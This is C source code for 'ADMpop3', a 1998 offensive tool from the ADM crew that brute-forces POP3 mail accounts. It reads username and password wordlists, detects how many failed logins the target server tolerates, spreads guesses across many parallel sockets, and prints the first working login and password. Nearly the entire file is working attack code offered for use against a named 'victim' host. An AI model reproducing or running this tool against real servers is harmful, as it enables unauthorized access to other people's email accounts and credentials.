/**********************************/
/* ADMpop3 (c) 1998 ADM           */
/* multi socket brute forcer      */
/* without fork ;)nice inst it? :) */
/* optimised for all pop3         */
/* popd who deconnex after 1 try  */
/* popd who deconnex after 3 try  */
/* popd who never disconnect you  */
/**********************************/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <time.h>

#define VERSION   "1.5 beta pub"
#define PROGGIE   "ADM pop3 forcer multi socket (without fork()!!!)"
#define PROJECT   "ADMhack,ADMtools,ADMw0rm"
#define FAKE_USERNAME "USER }{3|k3\n"
#define FAKE_PASSWORD "PASS D|3dIe\n"
#define HEIKE     666



int HOW = 10;			/* how many socket ? :) */

#define STRL 		   10	/* max pass/user len   */

#define CONNECTION_TRY     3	/* how many try for make a connexion */
#define CONNECTION_SLEEP   2	/* time to sleep before every connexion try */
#define CONNECTION_TIMEOUT 4	/* how many time u wanna w8  for the connex awnser */

#define TIME_LIVE          30	/* time to live of a inactive connection */

#define READ_TIMEOUT       5	/* grmbl check the read_time() function! */

#define KEWL_POP           100
#define UGLY_POP           1

void bzero (void *, int);
void usleep (unsigned long);
int strncmp (const char *, const char *, size_t);
char *strstr (const char *, const char *);

struct brutal
  {
    FILE *user;
    FILE *pass;
    char USER[19];
    char PASS[19];
    int s;
    char op;
    time_t timez;
    char num_try;
  };

struct brutal *bruteme[];

FILE *fuser;
FILE *fpass;

char type_of_pop = 0;

/* count the number of try permit by the srv pop */


void 
gimmestruct (int i)
{
  int a;
  for (a = 0; a < i; a++)
    bruteme[a] = calloc (1, sizeof (struct brutal));
}

int
read_time (int s, char *data, int size, int timez)
{
  u_long timou = 0;
  u_long tima = 0;
  int b = 0;

  timou = 100 * timez;
  for (tima = 0; tima < timou; tima++)
    {
      if ((b = read (s, data, size)) != -1)
	return (b);
      usleep (10000);
    }
  printf ("Timeout ...\n");
  return (-1);
}


int
connex (unsigned long hostversion, unsigned short port)
{
  struct sockaddr_in hostaddr;
  int soc;
  int try, c;
  int fdflag;
  fd_set fdset;
  struct timeval timeout;
  int opt, optlen, i;


  hostaddr.sin_port = htons (port);
  hostaddr.sin_addr.s_addr = hostversion;
  hostaddr.sin_family = AF_INET;
  c = -1;
  for (try = 0; try < CONNECTION_TRY; try++)
    {
      soc = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
      fdflag = fcntl (soc, F_GETFL, 0);
      fcntl (soc, F_SETFL, fdflag | O_NONBLOCK);
      if (soc == -1)
	continue;
      c = (connect (soc, (struct sockaddr *) &hostaddr, sizeof (hostaddr)));
      if (c == 0)
	break;
      if (errno == EINPROGRESS)
	{
	  FD_ZERO (&fdset);
	  FD_SET (soc, &fdset);
	  timeout.tv_usec = 0;
	  timeout.tv_sec = CONNECTION_TIMEOUT;
	  if (select (soc + 1, NULL, &fdset, NULL, &timeout) == 1)
	    {
	      getsockopt (soc, SOL_SOCKET, SO_ERROR, &opt, &optlen);
	      if (opt == 0)
		{
		  c = 0;
		  break;
		}
	    }
	  else
	    printf ("Connection timeout\n");
	}
      printf ("Fail to connect port %i (try %i)\n", port, try);
      close (soc);
      soc = -1;
      sleep (CONNECTION_SLEEP);
    }

  if (c != 0)
    {
      if (soc != -1)
	close (soc);
      soc = -1;
    }
  else
    fcntl (soc, F_SETFL, fdflag);

  i = c;			/* compatibility */

  return (soc);
}


int
reconnex (int a, u_long ip)
{
  char tmp[255];

  bzero (tmp, sizeof (tmp));


  close (bruteme[a]->s);

  if ((bruteme[a]->s = connex (ip, 110)) == -1)
    {
      printf ("the socket %i cant connect\n", a);
      bruteme[a]->op = 69;
      return (-1);
    }

  printf ("socket %i re connected \n", a);
  fcntl (bruteme[a]->s, F_SETFL, O_NONBLOCK);

  if ((read_time (bruteme[a]->s, tmp, sizeof (tmp), READ_TIMEOUT)) == -1)
    {
      bruteme[a]->op = 69;
      return (-1);
    }
  printf ("%s\n", tmp);

  return (1);
}

int
logout (int a)
{
  return (write (bruteme[a]->s, "QUIT\n", strlen ("QUIT\n")));
}

unsigned long
host2ip (char *serv)
{
  struct sockaddr_in sinn;
  struct hostent *hent;

  hent = gethostbyname (serv);
  if (hent == NULL)
    return 0;
  bzero ((char *) &sinn, sizeof (sinn));
  memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
}

int
howlong (time_t timez)
{
  if ((time (NULL) - TIME_LIVE) < timez)
    return (1);
  else
    {
      printf ("tiMEOUT\n");
      return (-1);
    }
}

/******* Read n pass *******/

int
readnpass (int s)
{
  int b = 0;
  char tmp[255];

  fcntl (s, F_SETFL, O_NONBLOCK);


  if (write (s, FAKE_USERNAME, strlen (FAKE_USERNAME)) == -1)
    {
      printf ("write failed ...\n");
      return (-1);
    }

  bzero (tmp, sizeof (tmp));

  if ((b = read_time (s, tmp, sizeof (tmp), READ_TIMEOUT)) == -1 || b == 0)
    {
      printf ("read timeout...\n");
      return (-1);
    }

  if (write (s, FAKE_PASSWORD, strlen (FAKE_PASSWORD)) == -1)
    {
      printf ("write failed..\n");
      return (-1);
    }

  bzero (tmp, sizeof (tmp));

  if ((b = read_time (s, tmp, sizeof (tmp), READ_TIMEOUT)) == -1 || b == 0)
    {
      printf ("read timeout...\n");
      return (-1);
    }

  if (strstr (tmp, "-ERR Too many login"))
    return (1);

  return (0);
}

void
gimme_the_type (u_long ip)
{
  char tmp[255];
  char try = 0;
  int s;
  int b = 0;

  bzero (tmp, sizeof (tmp));
  s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);

  if ((s = connex (ip, 110)) == -1)
    {
      printf ("the socket cant connect\n");
      exit (-1);
    }


  fcntl (s, F_SETFL, O_NONBLOCK);

  if ((read_time (s, tmp, sizeof (tmp), READ_TIMEOUT)) == -1)
    {
      printf ("read timeout.. :<\n");
      exit (-1);
    }

  if (strncmp (tmp, "+OK", 3) != 0)
    {
      printf ("%s\n", tmp);
      exit (-1);
    }

  if (write (s, FAKE_USERNAME, strlen (FAKE_USERNAME)) == -1)
    {
      printf ("write failed ...\n");
      exit (-1);
    }

  bzero (tmp, sizeof (tmp));

  if ((read_time (s, tmp, sizeof (tmp), READ_TIMEOUT)) == -1)
    {
      printf ("read timeout...\n");
      exit (-1);
    }

  if (write (s, FAKE_PASSWORD, strlen (FAKE_PASSWORD)) == -1)
    {
      printf ("write failed..\n");
      exit (-1);
    }

  if ((read_time (s, tmp, sizeof (tmp), READ_TIMEOUT + 5)) == -1)
    {
      printf ("read timeout...\n");
      exit (-1);
    }

  bzero (tmp, sizeof (tmp));

  if ((read_time (s, tmp, sizeof (tmp), READ_TIMEOUT)) != -1)
    {

      if (strstr (tmp, "signing off"))
	{
	  type_of_pop = 1;
	  printf ("type of pop: 1 try only !\n");
	  return;
	}
    }

  type_of_pop = 1;

  for (try = 0; try < 3; try++)
    {

      if ((b = readnpass (s)) == 1)
	{
	  type_of_pop = type_of_pop++;
	  printf ("type of pop: allow %i\n", type_of_pop);
	  return;
	}
      if (b == -1)
	return;
      if (b == 0)
	type_of_pop++;

    }

  type_of_pop = 100;
  return;
}


void
main (int argc, char **argv)
{
  FILE *povfile;

  u_long ip;

  int i = 0;
  int a = 0;
  int y = 0;


  char pathfilez[255];
  char pathfilez2[255];
  char tmp[255];
  char passy[10];

  printf ("-=* The ADM Crew *=-\n");
  printf ("ADMpop3 brute forcer\n");
  printf ("just the best of the world ;) \n");

  if (argc < 4)
    {
      printf ("ADM-pop <victim> <user filez> <pass filez> [how many socket] \n");
      exit (0);
    }

  fuser = fopen (argv[2], "r");
  if (fuser == NULL)
    {
      printf ("cant open:%s\n", argv[2]);
      exit (-1);
    }

  fpass = fopen (argv[3], "r");
  if (fpass == NULL)
    {
      printf ("cant open:%s\n", argv[3]);
      exit (-1);
    }

  ip = host2ip (argv[1]);
  if (ip == 0)
    {
      printf ("bad host:%s\n", argv[1]);
      exit (-1);
    }

  if (argv[4] != NULL)
    HOW = atoi (argv[4]);

  sprintf (pathfilez, "/tmp/.ADM-pop3.%i.", getpid ());

  a = 0;
  gimmestruct (HOW);

  printf ("let's me see diz pop!\n");
  gimme_the_type (ip);
  printf ("type of pop: %i\n", type_of_pop);


  while (!feof (fpass))
    {
      fscanf (fpass, "%s", passy);

      sprintf (pathfilez2, "%s%i", pathfilez, a);

      povfile = fopen (pathfilez2, "a+");

      fprintf (povfile, "%s\n", passy);

      fclose (povfile);

      a++;

      if (a == HOW)
	a = 0;

    }

  for (a = 0; a < HOW; a++)
    {

      sprintf (pathfilez2, "%s%i", pathfilez, a);
      bruteme[a]->s = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);
      bruteme[a]->pass = fopen (pathfilez2, "r");
      bruteme[a]->user = fopen (argv[2], "r");
      bruteme[a]->op = 0;
      bruteme[a]->timez = time (NULL);
      bzero (bruteme[a]->USER, 19);
      bzero (bruteme[a]->PASS, 19);

    }


  while (1)
    {
      for (a = 0; a < HOW; a++)
	{
	  switch (bruteme[a]->op)
	    {
	    case 0:

	      printf ("s:%i connection o server\n", a);

	      bruteme[a]->num_try = 0;

	      if (reconnex (a, ip) == -1)
		{
		  bruteme[a]->op = 69;
		  break;
		}
	      else
		printf ("socket %i connected..\n%s\n", a, tmp);

	      bruteme[a]->op++;

	      break;

	    case 1:
	      printf ("s: %i read the username..\n", a);

	      bzero (bruteme[a]->USER, 19);

	      fscanf (bruteme[a]->user, "%s", bruteme[a]->USER);
	      if (feof (bruteme[a]->user))
		{
		  bruteme[a]->op = 69;
		  break;
		}
	      bruteme[a]->op++;

	      break;

	    case 2:
	    case 71:
	      bruteme[a]->timez = time (NULL);

	      sprintf (tmp, "USER %s\n", bruteme[a]->USER);
	      printf ("socket %i:%s\n", a, tmp);


	      if ((write (bruteme[a]->s, tmp, strlen (tmp))) == -1)
		{
		  printf ("s:%i write failed \n", a);
		  if (reconnex (a, ip) == -1)
		    bruteme[a]->op = 69;
		  else
		    bruteme[a]->op = 2;
		  break;
		}

	      bzero (tmp, sizeof (tmp));
	      bruteme[a]->op++;
	      break;

	    case 3:
	      bruteme[a]->timez = time (NULL);
	      bzero (tmp, sizeof (tmp));

	      if (read (bruteme[a]->s, tmp, sizeof (tmp)) != -1)
		{
		  printf ("s: %i we get the reponse from the srv\n%s\n", a, tmp);
		  if (strncmp (tmp, "+OK", 3) == 0)
		    {
		      bruteme[a]->op++;
		      printf ("OK..\n");
		    }
		  else
		    bruteme[a]->timez = HEIKE;
		}

	      if (howlong (bruteme[a]->timez) == -1)
		{

		  if (reconnex (a, ip) == -1)
		    {
		      bruteme[a]->op = 69;
		      break;
		    }
		  if (bruteme[a]->op < 69)
		    bruteme[a]->op = 2;
		  else
		    bruteme[a]->op = 71;
		}

	      break;

	    case 4:
	      printf ("s: %i read n send password\n", a);

	      bzero (bruteme[a]->PASS, 19);
	      fscanf (bruteme[a]->pass, "%s", bruteme[a]->PASS);

	    case 73:

	      bzero (tmp, sizeof (tmp));
	      sprintf (tmp, "PASS %s\n", bruteme[a]->PASS);

	      printf ("s:%i %s", a, tmp);

	      bruteme[a]->timez = time (NULL);

	      if ((write (bruteme[a]->s, tmp, strlen (tmp))) == -1)
		{
		  printf ("the second write failed:>\n");
		  if (reconnex (a, ip) == -1)
		    {
		      bruteme[a]->op = 69;
		      break;
		    }

		  if (bruteme[a]->op < 69)
		    bruteme[a]->op = 2;
		  else
		    bruteme[a]->op = 71;

		  break;
		}



	      bzero (tmp, sizeof (tmp));
	      bruteme[a]->op = 5;

	      break;

	    case 5:

	      bzero (tmp, sizeof (tmp));


	      if (read (bruteme[a]->s, tmp, sizeof (tmp)) != -1)
		{
		  printf ("s:%i %s\n", a, tmp);
		  if (strncmp (tmp, "+OK", 3) == 0)
		    {
		      printf ("s:%i\n\033[01mlogin:%s\npassword:%s\n\033[0m", a, bruteme[a]->USER, bruteme[a]->PASS);
		      exit (0);
		    }
		  else
		    {
		      printf ("s: %i failed...\n", a);
		      bruteme[a]->num_try++;
		      /* test how many try we are allowed.. */

		      if (type_of_pop != KEWL_POP &&
			  bruteme[a]->num_try >= type_of_pop)
			{

			  logout (a);
			  bruteme[a]->num_try = 0;
			  if (reconnex (a, ip) == -1)
			    {
			      bruteme[a]->op = 69;
			      break;
			    }
			}

		      if (!feof (bruteme[a]->pass))
			bruteme[a]->op = 2;
		      else
			{
			  rewind (bruteme[a]->pass);
			  bruteme[a]->op = 0;
			}

		    }

		  if (howlong (bruteme[a]->timez) == -1)
		    {

		      if (reconnex (a, ip) == -1)
			{
			  bruteme[a]->op = 69;
			  break;
			}
		      bruteme[a]->op = 71;

		      break;
		    }

		  break;

		}		/* if */
	      break;

	    default:
	      y = 0;
	      for (i = 0; i < HOW; i++)
		if (bruteme[a]->op == 69)
		  y++;
	      if (y == HOW)
		{
		  printf ("hey we cant connect any more @#@#$ fuk  @#$#\n");
		  exit (0);
		}
	    }			/* switch */
	}			/*  for */
    }				/* while */
}
